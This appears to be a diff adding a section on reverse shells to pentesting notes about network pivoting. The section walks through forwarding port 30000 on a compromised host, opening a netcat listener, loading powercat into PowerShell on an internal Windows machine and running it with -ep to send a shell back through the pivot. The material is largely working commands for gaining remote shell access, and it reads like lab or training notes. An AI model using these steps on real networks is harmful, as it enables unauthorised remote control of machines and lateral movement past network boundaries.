@@ -32,3 +32,27 @@
 - Now you can naturally access the internal network from your attack machine
 
 
+
+************************************************************************************************************************************************
+FOR REV SHELLS PART:
+
+- Go to your terminal where you are connected as your first machine and type:
+                listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+        So basically any traffic on port 30000 will be redirected to us as local machine on 127.0.0.1 at 10000 port.
+
+- Listen on your local machine in new terminal
+                nc -lvnp 10000
+
+- Now in the internal computer (the second machine to which we pivoted in last) use powercat to get a rev shell. 
+                https://github.com/besimorhino/powercat/blob/master/powercat.ps1
+
+- Just open powershell and write a function:
+                function powercat 
+                and then paste the whole program there
+
+- Now use powercat on windows and then it will be forwarded to our local machine on port 10000. The command is:
+                powercat -c (new ip of the windows machine) -p 30000 -ep
+
+
+
+
